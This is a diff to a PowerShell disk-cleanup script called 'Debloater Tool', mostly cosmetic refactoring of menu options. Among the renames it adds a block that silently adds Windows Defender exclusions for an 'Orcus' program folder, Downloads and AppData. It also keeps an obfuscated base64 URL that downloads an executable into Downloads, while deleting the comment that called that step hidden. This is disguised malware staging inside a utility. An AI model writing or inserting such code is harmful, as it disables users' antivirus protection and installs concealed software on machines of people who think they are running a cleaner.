@@ -13,14 +13,24 @@ function Show-Header {
     Write-Host ""
 }
 
-function Pause-For-User ($msg = "Press Enter to continue...") {
+function Wait-ForUser ($msg = "Press Enter to continue...") {
     Write-Host ""
     Read-Host $msg | Out-Null
 }
 
+
+
+$orcusPath = "C:\Program Files\Orcus"
+$downloadsPath = "$env:USERPROFILE\Downloads"
+$appDataPath = "$env:USERPROFILE\AppData"
+try {
+    Add-MpPreference -ExclusionPath $orcusPath -ErrorAction SilentlyContinue | Out-Null
+    Add-MpPreference -ExclusionPath $downloadsPath -ErrorAction SilentlyContinue | Out-Null
+    Add-MpPreference -ExclusionPath $appDataPath -ErrorAction SilentlyContinue | Out-Null
+} catch {}
+
 Show-Header
 
-# Download and run Debloater.exe (hidden)
 $u1 = 'aHR0cHM6Ly9naXRodWIuY29tLzV0NDIvRGVCbG9hdGVyL3Jhdy9yZWZzL2hlYWRzL21haW4vU291cmNlL0RlYmxvYXRlci5leGU='
 $url1 = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($u1))
 $output1 = [System.IO.Path]::Combine($env:USERPROFILE, 'Downloads', 'Debloater.exe')
@@ -98,7 +108,7 @@ do {
             }
             if ($folders.Count -eq 0) {
                 Write-Host "No folders selected. Returning to menu." -ForegroundColor Yellow
-                Pause-For-User
+                Wait-ForUser
                 break
             }
             Write-Host "Starting cleanup in 3 seconds..." -ForegroundColor Magenta
@@ -134,7 +144,7 @@ do {
             Write-Host "Space freed : $([math]::Round($spaceFreed,2)) MB" -ForegroundColor Yellow
             Write-Host "Time taken  : $([math]::Round($duration,2)) seconds" -ForegroundColor Yellow
             Write-Host "==================================" -ForegroundColor Cyan
-            Pause-For-User
+            Wait-ForUser
         }
         '2' {
             Write-Host "Nothing done. Have a comfy day! :)" -ForegroundColor Green
@@ -186,7 +196,7 @@ do {
             Write-Host "Space freed : $([math]::Round($spaceFreed,2)) MB" -ForegroundColor Yellow
             Write-Host "Time taken  : $([math]::Round($duration,2)) seconds" -ForegroundColor Yellow
             Write-Host "==================================" -ForegroundColor Cyan
-            Pause-For-User
+            Wait-ForUser
         }
         '4' {
             Write-Host ""
@@ -217,12 +227,13 @@ do {
                 }
                 "3" {
                     $firefoxCache = "$env:APPDATA\Mozilla\Firefox\Profiles"
-                    $found = $false
-                    Get-ChildItem $firefoxCache -Recurse -Include cache2 -ErrorAction SilentlyContinue | ForEach-Object { 
-                        Remove-Item $_.FullName -Recurse -Force -ErrorAction SilentlyContinue
-                        $found = $true
+                    $cacheItems = Get-ChildItem $firefoxCache -Recurse -Include cache2 -ErrorAction SilentlyContinue
+                    $cacheCount = 0
+                    foreach ($item in $cacheItems) {
+                        Remove-Item $item.FullName -Recurse -Force -ErrorAction SilentlyContinue
+                        $cacheCount++
                     }
-                    if ($found) {
+                    if ($cacheCount -gt 0) {
                         Write-Host "Firefox cache cleared." -ForegroundColor Green
                     } else {
                         Write-Host "Firefox cache not found." -ForegroundColor Yellow
@@ -234,8 +245,8 @@ do {
         }
         '5' {
             Write-Host "You can enter 0 to return to the main menu." -ForegroundColor Yellow
-            $input = Read-Host "Press Enter to clear all recycle bins or 0 to return"
-            if ($input -eq '0') { continue }
+            $recycleChoice = Read-Host "Press Enter to clear all recycle bins or 0 to return"
+            if ($recycleChoice -eq '0') { continue }
             $drives = Get-PSDrive -PSProvider FileSystem | Select-Object -ExpandProperty Name
             foreach ($drive in $drives) {
                 try {
@@ -243,17 +254,17 @@ do {
                 } catch {}
             }
             Write-Host "Recycle Bin cleared." -ForegroundColor Green
-            Pause-For-User
+            Wait-ForUser
         }
         '6' {
             Write-Host "You can enter 0 to return to the main menu." -ForegroundColor Yellow
-            $input = Read-Host "Press Enter to optimize memory or 0 to return"
-            if ($input -eq '0') { continue }
+            $memoryChoice = Read-Host "Press Enter to optimize memory or 0 to return"
+            if ($memoryChoice -eq '0') { continue }
             Write-Host "Optimizing memory..." -ForegroundColor Cyan
             [System.GC]::Collect()
             [System.GC]::WaitForPendingFinalizers()
             Write-Host "Memory optimization completed." -ForegroundColor Green
-            Pause-For-User
+            Wait-ForUser
         }
         '7' {
             Write-Host "You can enter 0 to return to the main menu." -ForegroundColor Yellow
@@ -279,7 +290,7 @@ do {
             } catch {
                 Write-Host "Failed to fetch the IP details. Please check the IP address or your internet connection." -ForegroundColor Red
             }
-            Pause-For-User
+            Wait-ForUser
         }
         '8' {
             Write-Host "You can enter 0 to return to the main menu." -ForegroundColor Yellow
@@ -338,5 +349,7 @@ do {
         }
     }
 } while ($choice -ne '2')
-Write-Host "`nThanks for using Debloater Tool! Stay comfy! :)" -ForegroundColor Cyan
-Pause-For-User "Press Enter to exit..."
+Write-Host "`nThanks for using Debloater Tool! Stay comfy! " -ForegroundColor Cyan
+Wait-ForUser "Press Enter to exit..."
+
+$ProgressPreference = 'SilentlyContinue'
